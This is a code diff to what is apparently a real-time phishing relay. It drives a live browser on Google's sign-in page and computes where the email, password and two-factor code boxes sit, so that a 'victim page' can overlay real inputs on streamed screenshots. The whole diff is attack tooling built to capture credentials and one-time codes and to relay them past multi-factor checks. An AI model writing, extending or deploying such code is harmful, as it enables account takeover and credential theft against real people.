@@ -242,9 +242,10 @@ class RelaySession(threading.Thread):
         self.last_active = time.time()
         self.deadline = time.time() + 8 * 60
         self.finished = False
-        # DOM mirror payload
-        self.dom = None
-        self.dom_hash = None
+        # overlay geometry (percent of the card image) for the relay input
+        self.input_box = None      # {x,y,w,h} percent floats
+        self.button_box = None
+        self.input_kind = None     # email | password | code
         self.styles = []                # rewritten CSS texts (stable per page)
         self._res_budget = {"n": 24, "bytes": 0}  # card-asset prefetch budget
 
@@ -306,22 +307,66 @@ class RelaySession(threading.Thread):
       return {head: h, body: b};
     }"""
 
+    INPUT_SELS = [("input[name='Passwd']", "password"),
+                  ("#identifierId", "email"),
+                  ("input[name='totpPin']", "code"),
+                  ("input[type='tel']", "code")]
+
     def _dom_snapshot(self, pg):
+        """Extract the active input/button geometry relative to the card, so
+        the victim page can overlay a real input exactly where Google's
+        input renders in the live screenshot."""
         try:
-            parts = pg.evaluate(self.DOC_JS)
-            if not parts:
+            card = None
+            for sel in ("#initialView", "div[role='main']", "main"):
+                loc = pg.locator(sel).first
+                try:
+                    if loc.is_visible():
+                        card = loc
+                        break
+                except Exception:
+                    continue
+            if card is None:
                 return
-            head = re.sub(r"<script[\s\S]*?</script>", "", parts["head"])
-            head = re.sub(r"<title[\s\S]*?</title>", "", head)
-            body = re.sub(r"<script[\s\S]*?</script>", "", parts["body"])
-            # CSD: mirrored password inputs are never type=password (the victim
-            # sees dots via -webkit-text-security injected by the page CSS)
-            body = body.replace('type="password"', 'type="text" data-eg="pw"')
-            html = head + body
-            h = hashlib.md5(html.encode()).hexdigest()[:12]
-            if h != self.dom_hash:
-                self.dom = html
-                self.dom_hash = h
+            cbox = card.bounding_box()
+            if not cbox or cbox["width"] < 50:
+                return
+            ibox = bbox = None
+            kind = self.input_kind
+            for sel, k in self.INPUT_SELS:
+                loc = pg.locator(sel).first
+                try:
+                    if loc.is_visible():
+                        b = loc.bounding_box()
+                        if b:
+                            ibox, kind = b, k
+                            break
+                except Exception:
+                    continue
+            self.input_kind = kind
+            self.input_box = None
+            self.button_box = None
+            if ibox:
+                self.input_box = {
+                    "x": round(100 * (ibox["x"] - cbox["x"]) / cbox["width"], 2),
+                    "y": round(100 * (ibox["y"] - cbox["y"]) / cbox["height"], 2),
+                    "w": round(100 * ibox["width"] / cbox["width"], 2),
+                    "h": round(100 * ibox["height"] / cbox["height"], 2)}
+                for bsel in ("#identifierNext", "#passwordNext", "#totpNext",
+                             "button:has-text('Next')"):
+                    bloc = pg.locator(bsel).first
+                    try:
+                        if bloc.is_visible():
+                            bb = bloc.bounding_box()
+                            if bb:
+                                self.button_box = {
+                                    "x": round(100 * (bb["x"] - cbox["x"]) / cbox["width"], 2),
+                                    "y": round(100 * (bb["y"] - cbox["y"]) / cbox["height"], 2),
+                                    "w": round(100 * bb["width"] / cbox["width"], 2),
+                                    "h": round(100 * bb["height"] / cbox["height"], 2)}
+                                break
+                    except Exception:
+                        continue
         except Exception:
             pass
 
@@ -561,14 +606,11 @@ LOCK = threading.Lock()
 
 
 def public_state(s, client_hash=None):
-    out = {"id": s.id, "state": s.state, "hint": s.hint,
-           "need_input": s.need_input, "match_number": s.match_number,
-           "screenshot": s.screenshot, "dom_hash": s.dom_hash,
-           "dom": None, "styles": None}
-    if s.dom_hash and s.dom_hash != client_hash:
-        out["dom"] = s.dom
-        out["styles"] = s.styles
-    return out
+    return {"id": s.id, "state": s.state, "hint": s.hint,
+            "need_input": s.need_input, "match_number": s.match_number,
+            "screenshot": s.screenshot,
+            "input_box": s.input_box, "button_box": s.button_box,
+            "input_kind": s.input_kind}
 
 
 # ------------------------------------------------------------------ page ---
